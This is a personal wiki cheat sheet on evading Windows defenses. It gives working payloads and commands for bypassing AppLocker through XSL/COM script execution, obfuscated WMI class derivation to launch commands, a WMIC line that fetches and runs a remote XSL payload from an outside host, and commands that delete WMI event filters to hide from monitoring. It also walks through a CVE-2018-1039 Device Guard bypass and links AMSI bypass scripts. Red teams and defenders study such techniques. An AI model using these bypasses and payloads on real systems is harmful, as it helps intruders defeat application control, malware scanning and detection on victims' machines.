---
title: "Defenses Evasion (The Quick'n Dirty)"
slug: "defenses-evasion-(the-quickn-dirty)"
priority: 4
editor: "wysiwyg"
revisionCount: 2
id: 48
createdAt: "2020-06-26T22:07:32Z"
createdBy: "boschko"
updatedAt: "2020-06-28T23:41:15Z"
updatedBy: "boschko"
ownedBy: "boschko"
views: 12
---
<p id="bkmrk-this-is-just-a-quick">This is just a quick and dirty overview of some defense evasion tactics that are out there for some the common services / processes. I might post something in the future that dives into this deeper - if you don't want to wait for that day to come I'm sharing with you below some amazing resources and articles I've appreciated in the past.</p>
<hr id="bkmrk-"><h5 id="bkmrk-awesome-tool-for-res">Awesome tool for restricted env. evasion:</h5>
<p id="bkmrk-https%3A%2F%2Fgithub.com%2Fc"><br>https://github.com/Cn33liz/p0wnedLoader<br>https://rastamouse.me/2018/05/csharp-dotnettojscript-xsl/<br>https://github.com/Arno0x/PowerShellScripts<br>https://github.com/cobbr/PSAmsi/wiki/Introduction-To-PSAmsi<br>https://github.com/secabstraction/WmiSploit <br><br></p>
<h5 id="bkmrk-more%3A">More:</h5>
<p id="bkmrk-https%3A%2F%2Fbohops.com%2F2"><br><a href="https://bohops.com/2019/01/10/com-xsl-transformation-bypassing-microsoft-application-control-solutions-cve-2018-8492/">https://bohops.com/2019/01/10/com-xsl-transformation-bypassing-microsoft-application-control-solutions-cve-2018-8492/</a> <br><a href="https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html">https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html</a> <br>https://oddvar.moe/<br>https://www.fortynorthsecurity.com/building-a-windows-defender-application-control-lab/<br>https://posts.specterops.io/threat-detection-using-windows-defender-application-control-device-guard-in-audit-mode-602b48cd1c11<br>https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/<br>https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/evaluate-windows-defender-exploit-guard<br>http://www.exploit-monday.com/2018/06/device-guard-and-application.html<br>https://lolbas-project.github.io/#<br><a href="https://www.contextis.com/en/blog/amsi-bypass">https://www.contextis.com/en/blog/amsi-bypass</a></p>
<hr id="bkmrk--0"><p id="bkmrk-%C2%A0"> </p>
<h4 id="bkmrk-application-identify">Application Identify Service (Process name: AppIDSvc)</h4>
<p id="bkmrk-definition%3A%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0"><span style="text-decoration: underline;">Definition:</span><br>                 The Application Identity service determines and verifies the identity of an app. <br>                 Stopping this service will prevent AppLocker policies from being enforced.</p>
<p id="bkmrk-important%3A-when-usin"><span style="text-decoration: underline;">Important:</span> <br>When using Group Policy, you must configure it to start automatically in at least one Group Policy Object (GPO) that applies AppLocker rules. This is because AppLocker uses this service to verify the attributes of a file.</p>
<p id="bkmrk-identification%3Aget-s"><span style="text-decoration: underline;">Identification:</span><br><code>Get-Service appidsvc</code></p>
<p id="bkmrk-bypass-through-com-o"><span style="text-decoration: underline;">Bypass through COM object technique:</span></p>
<p id="bkmrk-1%29-store-payload-in-">1) Store payload in XML file:</p>
<pre id="bkmrk-%3C%3Fxml-version%3D%271.0%27%3F"><code class="language-xml">&lt;?xml version='1.0'?&gt;
	&lt;stylesheet
	xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
	version="1.0"&gt;
	&lt;output method="text"/&gt;
	&lt;ms:script implements-prefix="user" language="JScript"&gt;
		&lt;![CDATA[
		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
		]]&gt; &lt;/ms:script&gt;
&lt;/stylesheet&gt;</code></pre>
<p id="bkmrk-2%29-use-%22com%22-object-">2) Use "COM" object to execute payload: </p>
<pre id="bkmrk-%24xsl-%3D-new-object--c"><code class="language-powershell">$xsl = new-object -ComObject Msxml2.DoMDocument.6.0
$xsl.load("C:\Users\Victim\Documents\minimalist.xml") | out-null
$xsl.setProperty("AllowXsltScript",$true)
$xsl.transformNode($xsl)</code></pre>
<p id="bkmrk-%C2%A0-0"> </p>
<h4 id="bkmrk-evade-detection-and%2F">Evade Detection and/or Restricted Environments</h4>
<p id="bkmrk-wmi-class-derivation">WMI Class Derivation (Evasion) with no "win32" prefix:</p>
<pre id="bkmrk-%24c-%3D-%5Bwmiclass%5D-%27%2Fro"><code class="language-powershell">$C = [WmiClass] '/root/cimv2:Win32_Process'
$N = $C.derive('MyEvilProcess')
$N.Put()
Invoke-WmiMethod MyEvilProcess -Name CrEaTe -ArgumentList calc.exe</code></pre>
<p id="bkmrk-%C2%A0-3">Advanced WMI Class Derivation - presented at Security BsidesDublin 2019 talk.<br>Full details <a href="https://github.com/kmkz/PowerShell/tree/master/BsidesDublin-2019">https://github.com/kmkz/PowerShell/tree/master/BsidesDublin-2019</a> </p>
<pre id="bkmrk-%23-randomname-functio"><code class="language-powershell"># RandomName function:
function GenerateRandomName(){

    $Pf = "abcdefghijkmnopqrstuvwxyzABCEFGHJKLMNPQRSTUVWXYZ23456789".TOchArarRay()
    $rSVdssS1=""
    1..10 | ForEach {  $rSVdssS1 += $Pf | Get-Random }
    return $rSVdssS1
}

# Class derivation
zNrF = -jOin[regex]::MaTcHeS('sSeCorp_23nIw:2VmIc/tOoR/',".",'RightToLeft')
$CoFtfEgvsJ = [wMicLaSs]$zNrF
$YepTa = "pRoc"+"eSs"
$PoDtbeF4Dp= GenerateRandomName
$N = $CoFtfEgvsJ.dEriVe("$PoDtbeF4Dp")
$N.pUt()
$BlzQ=0
$VrBnZ=111-1+3+7+5+5-3+$BlzQ
$CpOnBt5= gEt-cOntEnt -paTh "\\Vboxsvr\shared\BSIDESIE\cmd.in.txt" # your command

# Payload execution:
iNvokE-wmIMeThOd $PoDtbeF4Dp -NaMe CrEaTe -arGumEntlIst "cMd ^/c $CpOnBt5 &gt;&gt;\\Vboxsvr\shared\BSIDESIE\$rSVdssS.lol" # collect output (if needed)

</code></pre>
<p id="bkmrk-authenticated-proxy-">Authenticated proxy bypass:<br>"Creates a TCP Tunnel through the default system proxy. As such, it automatically handles proxy authentication if ever required."<br><a href="https://github.com/Arno0x/PowerShellScripts/blob/master/proxyTunnel.ps1">https://github.com/Arno0x/PowerShellScripts/blob/master/proxyTunnel.ps1</a> </p>
<p id="bkmrk-powershell-without-p">PowerShell without PowerShell + restricted env. escaping through WMIC XSL payload execution:</p>
<pre id="bkmrk-c%3A%5Cwindows%5Csystem32%5C"><code class="language-">C:\Windows\System32\WMIC.exe os get /format:"https://tatamaster.lol/p0wnedLoader/p0wnedLoader.xsl"</code></pre>
<p id="bkmrk-%C2%A0-6">Blue team/detection mechanisms evasion for WMI lateral movements:<br>(Add following line to your payload to remove Windows "Applications" EvenViewer logs)</p>
<pre id="bkmrk-get-wmiobject-__even"><code class="language-powershell">Get-WmiObject __eventFilter -namespace root/subscription -filter "name='_PersistenceEvent_'"| Remove-WmiObject
Get-WmiObject __eventFilter -namespace root/subscription -filter "name='_ProcessCreationEvent_'"| Remove-WmiObject</code></pre>
<p id="bkmrk-%C2%A0-8"> </p>
<h4 id="bkmrk-antimalware-scan-int">Antimalware Scan Interface (AMSI)</h4>
<p id="bkmrk-%C2%A0-10">Identification (for ScanBuffer): <br>In a PowerShell terminal, enter “AmsiScanBuffer” (with double quotes)<br><br>Bypasses:<br><a href="https://github.com/kmkz/PowerShell/blob/master/amsi-bypass.ps1">https://github.com/kmkz/PowerShell/blob/master/amsi-bypass.ps1</a> <br><br>Resources:<br><a href="https://www.contextis.com/en/blog/amsi-bypass">https://www.contextis.com/en/blog/amsi-bypass</a> <br>https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/ (most recent techniques) <br><a href="https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html">https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html</a> </p>
<p id="bkmrk-%C2%A0-11"> </p>
<h4 id="bkmrk-applocker-demystific">AppLocker demystification</h4>
<p id="bkmrk-%22when-whitelisting-p"><br>"When whitelisting policies are enforced, PowerShell CLM is applied in AppLocker (for users in "Allowed Mode") and WDAC (for users and administrators)."</p>
<p id="bkmrk-error-message%3A-%22this"><br>Error message: "This app has been blocked by your system Administrator"</p>
<p id="bkmrk-bypass%3A1%29-use-p0wned">Bypass:<br>1) use p0wnedShell via .xsl file + encryption (for Defender Bypass) https://github.com/Cn33liz/p0wnedLoader for payload delivery (WMI)<br>Example: C:\Windows\System32\wbem\WMIC.exe os get /format:"https://tatamaster/p0wnedLoader.xsl"<br><br>2) https://github.com/kmkz/PowerShell/blob/master/Semi-interactive-shell-applocker-bypass.ps1</p>
<p id="bkmrk-resources%3A-p0wnedshe">Resources: <br>P0wnedShell by Cn33liz: https://github.com/Cn33liz/p0wnedShell<br>AAronLocker: https://blogs.msdn.microsoft.com/aaron_margosis/2018/06/26/announcing-application-whitelisting-with-aaronlocker/<br>https://www.slideshare.net/OddvarHlandMoe/appolockalypse-now<br>https://github.com/api0cradle/UltimateAppLockerByPassList</p>
<p id="bkmrk-%C2%A0-14"> </p>
<h4 id="bkmrk-windows-lockdown-pol">Windows Lockdown Policy (WLDP aka Device Guard) with User Mode Code Integrity (UMCI) policy</h4>
<p id="bkmrk-definition%3Awhen-%22enf">Definition:<br>When "enforced" by AppLocker policy, CLM COM object instantiation is very open. <br>In essence, (m)any COM object can be instantiated by default when WLDP is not active.<br>Under WDAC with UMCI, the WLDP greatly reduces this number (between 8 to 50 COM objects according to James Forshaw of Google Project Zero in this .NET COM Instantiation UMCI bypass disclosure write-up linked in "Resources" part).<br><br>Bypass based on CVE-2018-1039 by Google Project Zero:</p>
<pre id="bkmrk-1%29-create-a-%22keys.tx"><code class="language-ruby">1) Create a "keys.txt" file with following content:
	HKEY_CURRENT_USER\Software\Classes\CLSID\{70B46225-C474-4852-BB81-48E0D36F9A5A}
	= REG_SZ WScript.Shell
	HKEY_CURRENT_USER\Software\Classes\CLSID\{70B46225-C474-4852-BB81-48E0D36F9A5A}\TreatAs
	= REG_SZ {72C24DD5-D70A-438B-8A42-98424B88AFB8}
	HKEY_CURRENT_USER\Software\Classes\CLSID\{70B46225-C474-4852-BB81-48E0D36F9A5A}\Implemented Categories\{7DD95801-9882-11CF-9FA9-00AA006C42C4}
	HKEY_CURRENT_USER\Software\Classes\CLSID\{70B46225-C474-4852-BB81-48E0D36F9A5A}\Implemented Categories\{7DD95802-9882-11CF-9FA9-00AA006C42C4}

	2) From the explorer Run dialog execute “regini path\to\keys.txt”

	3) Create a "shell.html" file with following content (our payload):
		&lt;html&gt;
		    &lt;body&gt;
		    &lt;object id="obj" classid="clsid:70B46225-C474-4852-BB81-48E0D36F9A5A"&gt;NO OBJECT&lt;/object&gt;
			&lt;script&gt;
			try {
			    obj.Exec("notepad");
			} catch (e) {
			    alert(e.message);
			}
			&lt;/script&gt;
		    &lt;/body&gt;
		&lt;/html&gt;

	4) Execute the HTML file from the Run dialog using "hh.exe path\to\shell.html"</code></pre>
<p id="bkmrk-%C2%A0-16">Resources:<br>https://bugs.chromium.org/p/project-zero/issues/detail?id=1514 (fixed on 5/08/2018)<br>https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-1039</p>
<p id="bkmrk-%C2%A0-17"> </p>
<p id="bkmrk-%C2%A0-18"> </p>
<p id="bkmrk-%C2%A0-19"> </p>
<p id="bkmrk-%C2%A0-20"> </p>
<p id="bkmrk-%C2%A0-21"> </p>
<p id="bkmrk-%C2%A0-22"> </p>
<p id="bkmrk-%C2%A0-23"> </p>
<p id="bkmrk-%C2%A0-24"> </p>
<p id="bkmrk-%C2%A0-25"> </p>
<p id="bkmrk-%C2%A0-26"> </p>
<p id="bkmrk-%C2%A0-27"> </p>
<p id="bkmrk-%C2%A0-28"> </p>
<p id="bkmrk-%C2%A0-29"> </p>
<p id="bkmrk-%C2%A0-30"> </p>
<p id="bkmrk-%C2%A0-31"> </p>
<p id="bkmrk-%C2%A0-32"> </p>
<p id="bkmrk-%C2%A0-33"> </p>
<p id="bkmrk-%C2%A0-34"> </p>
<p id="bkmrk-%C2%A0-35"> </p>
<p id="bkmrk-%C2%A0-36"> </p>
<p id="bkmrk-%C2%A0-37"> </p>
<p id="bkmrk-%C2%A0-38"> </p>
<p id="bkmrk-%C2%A0-39"> </p>
<p id="bkmrk-%C2%A0-40"> </p>
<p id="bkmrk-%C2%A0-41"> </p>
<p id="bkmrk-%C2%A0-42"> </p>
<p id="bkmrk-%C2%A0-43"> </p>
<p id="bkmrk-%C2%A0-44"> </p>
<p id="bkmrk-%C2%A0-45"> </p>
<p id="bkmrk-%C2%A0-46"> </p>
<p id="bkmrk-%C2%A0-47"> </p>
<p id="bkmrk-%C2%A0-48"> </p>
<p id="bkmrk-%C2%A0-49"> </p>
<p id="bkmrk-%C2%A0-50"> </p>
<p id="bkmrk-%C2%A0-51"> </p>
<p id="bkmrk-%C2%A0-52"> </p>
<p id="bkmrk-%C2%A0-53"> </p>
<p id="bkmrk-%C2%A0-54"> </p>
<p id="bkmrk-%C2%A0-55"> </p>
<p id="bkmrk-%C2%A0-56"> </p>
<p id="bkmrk-%C2%A0-57"> </p>
